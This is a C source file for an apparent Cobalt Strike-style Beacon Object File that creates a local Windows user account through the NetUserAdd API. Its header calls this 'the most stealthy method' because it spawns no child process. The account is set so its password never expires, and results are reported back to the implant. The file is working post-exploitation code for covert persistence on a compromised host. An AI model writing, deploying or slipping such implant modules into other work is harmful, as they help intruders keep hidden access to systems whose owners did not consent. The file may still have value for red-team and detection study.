/*
 * user_create_net.c — Create a Windows user via NetUserAdd API.
 *
 * Uses NetAPI32.dll NetUserAdd function directly (no net.exe).
 * This is the most stealthy method as it doesn't spawn child processes.
 *
 * Args: "<username> <password>"
 *   Both username and password are required.
 *   The user will be created as a standard user (not admin).
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c user_create_net.c -o user_create_net.o
 */

#include <windows.h>
#include "beacon.h"

/* ---- NetAPI32 structures and constants ---- */
typedef struct _USER_INFO_1 {
    LPWSTR usri1_name;
    LPWSTR usri1_password;
    DWORD  usri1_password_age;
    DWORD  usri1_priv;
    LPWSTR usri1_home_dir;
    LPWSTR usri1_comment;
    DWORD  usri1_flags;
    LPWSTR usri1_script_path;
} USER_INFO_1;

#define USER_PRIV_USER 1
#define UF_SCRIPT 0x0001
#define UF_NORMAL_ACCOUNT 0x0200
#define UF_DONT_EXPIRE_PASSWD 0x10000

/* ---- BOF API Imports ---- */
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetUserAdd(LPCWSTR, DWORD, LPBYTE, LPDWORD);

/* ---- No-CRT helpers ---- */
static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src);
    bof_memcpy(dst + pos, src, len);
    return pos + len;
}
static int uitoa(char* buf, unsigned long v) {
    if (v == 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int ti = 0;
    while (v) { tmp[ti++] = '0' + (v % 10); v /= 10; }
    for (int i = 0; i < ti; i++) buf[i] = tmp[ti - 1 - i];
    return ti;
}

void go(char* args, int alen)
{
    char* username = NULL;
    char* password = NULL;
    int username_len = 0;
    int password_len = 0;

    /* Try parsing as two separate strings first (beacon16-null format) */
    if (args && alen >= 4) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        username = BeaconDataExtract(&parser, &username_len);

        /* Check if there's a second string */
        if (BeaconDataLength(&parser) >= 2) {
            password = BeaconDataExtract(&parser, &password_len);
        }
    }

    /* If second string not found, try parsing as single string "username password" */
    if (!password || password_len <= 0) {
        if (args && alen >= 2) {
            datap parser;
            BeaconDataParse(&parser, args, alen);
            char* input = BeaconDataExtract(&parser, &username_len);

            if (!input || username_len <= 0) {
                BeaconOutput(CALLBACK_ERROR,
                    "[UserNet] Usage: <username> <password>\n", 41);
                return;
            }

            /* Split at first space */
            char raw[512];
            bof_memset(raw, 0, sizeof(raw));
            int clen = username_len < 511 ? username_len : 511;
            bof_memcpy(raw, input, clen);
            raw[clen] = '\0';

            username = raw;
            password = NULL;

            for (int i = 0; i < clen; i++) {
                if (raw[i] == ' ') {
                    raw[i] = '\0';
                    password = raw + i + 1;
                    break;
                }
            }

            if (!password || bof_strlen(username) == 0 || bof_strlen(password) == 0) {
                BeaconOutput(CALLBACK_ERROR,
                    "[UserNet] Both username and password required\n", 47);
                return;
            }
            username_len = bof_strlen(username);
            password_len = bof_strlen(password);
        } else {
            BeaconOutput(CALLBACK_ERROR,
                "[UserNet] Usage: <username> <password>\n", 41);
            return;
        }
    }

    if (!username || !password || username_len <= 0 || password_len <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "[UserNet] Both username and password required\n", 47);
        return;
    }

    /* Convert username and password to wide strings */
    WCHAR wUsername[256];
    WCHAR wPassword[256];

    int ulen = KERNEL32$MultiByteToWideChar(65001, 0, username, -1, wUsername, 256);
    int plen = KERNEL32$MultiByteToWideChar(65001, 0, password, -1, wPassword, 256);

    if (ulen <= 0 || plen <= 0) {
        BeaconOutput(CALLBACK_ERROR,
            "[UserNet] String conversion failed\n", 35);
        return;
    }

    /* Prepare USER_INFO_1 structure */
    USER_INFO_1 ui;
    bof_memset(&ui, 0, sizeof(ui));
    ui.usri1_name = wUsername;
    ui.usri1_password = wPassword;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    /* Call NetUserAdd */
    DWORD parmErr = 0;
    DWORD result = NETAPI32$NetUserAdd(NULL, 1, (LPBYTE)&ui, &parmErr);

    char out[512]; int op = 0;
    if (result == 0) {
        op = sa(out, op, "[UserNet] User created successfully\n");
        op = sa(out, op, "  Username: "); op = sa(out, op, username); out[op++] = '\n';
        op = sa(out, op, "  Method  : NetUserAdd API\n");
        op = sa(out, op, "  Priv    : Standard User\n");
        BeaconOutput(CALLBACK_OUTPUT, out, op);
    } else {
        op = sa(out, op, "[UserNet] NetUserAdd failed (err ");
        op += uitoa(out + op, result);
        if (result == 2224) {
            op = sa(out, op, " - user already exists");
        } else if (result == 5) {
            op = sa(out, op, " - access denied");
        } else if (result == 2245) {
            op = sa(out, op, " - password too short");
        }
        out[op++] = ')'; out[op++] = '\n';
        BeaconOutput(CALLBACK_ERROR, out, op);
    }
}
